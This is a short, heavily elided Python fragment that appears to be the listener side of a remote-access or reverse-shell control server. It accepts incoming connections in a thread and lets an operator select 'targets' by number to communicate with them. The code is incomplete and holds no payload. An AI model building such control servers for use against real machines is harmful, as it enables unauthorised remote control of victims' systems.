...
def target_communications(target, ip):
	count = 0
	while True:
...
sock.listen(5)
tl = threading.Thread(target=accept_connections)
tl.start()
print(termcolor.colored('[+] Waiting For Incoming Connections...', 'green'))
...
while True:
	...
	if command == 'targets':
		...
		try:
			...
			tarnum = targets[num]
			tarip = ips[num]
			target_communications(tarnum, tarip)
		except:
